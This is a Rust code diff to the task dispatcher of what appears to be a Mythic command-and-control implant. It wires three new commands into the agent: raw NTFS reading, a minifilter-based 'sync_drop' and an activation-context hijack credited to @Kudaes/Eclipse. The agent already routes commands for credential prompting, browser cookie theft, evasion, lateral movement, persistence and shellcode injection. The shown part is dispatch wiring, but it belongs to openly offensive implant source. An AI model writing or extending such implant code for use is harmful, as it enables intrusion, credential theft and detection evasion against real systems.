@@ -11,7 +11,7 @@ use std::sync::{
 
 // Import all other commands
 use crate::{
-    askcreds, browser_cookies, c2manage, cat, cd, cleanup, clipboard, collection, cp, credentials, discovery, download, evasion, execute, exit, getenv, getprivs, jobs, lateral, ldap, ls, mkdir, mv, netstat, persist, portfwd, portscan, ps, pwd,
+    askcreds, browser_cookies, c2manage, cat, cd, cleanup, clipboard, collection, cp, credentials, discovery, download, eclipse, evasion, execute, exit, getenv, getprivs, jobs, lateral, ldap, ls, minifilter, mkdir, mv, netstat, ntfs_read, persist, portfwd, portscan, ps, pwd,
     redirect, rm, screenshot, setenv, shell, shinject, sleep, ssh, stealth, token, unsetenv, upload, workinghours,
 };
 
@@ -65,7 +65,9 @@ impl Tasker {
                 match task.command.as_str() {
                     // --- Background commands ---
                     "download" => self.spawn_bg(task, download::download_file, false)?,
+                    "ntfs_read" => self.spawn_bg(task, ntfs_read::ntfs_read, false)?,
                     "portscan" => self.spawn_bg(task, portscan::scan_ports, true)?,
+                    "sync_drop" => self.spawn_bg(task, minifilter::sync_drop, false)?,
                     #[cfg(target_os = "windows")]
                     "powershell" => self.spawn_bg(task, shell::run_powershell, false)?,
                     "redirect" => self.spawn_bg(task, redirect::setup_redirect, true)?,
@@ -218,6 +220,9 @@ impl Tasker {
 
                             // Stealth evasion commands (@Kudaes/Shelter)
                             "stealth_sleep" => stealth::stealth_sleep(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
+
+                            // Activation context hijack (@Kudaes/Eclipse)
+                            "actx_hijack" => eclipse::actx_hijack(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
 
                             _ => mythic_error!(
                                 task.id,
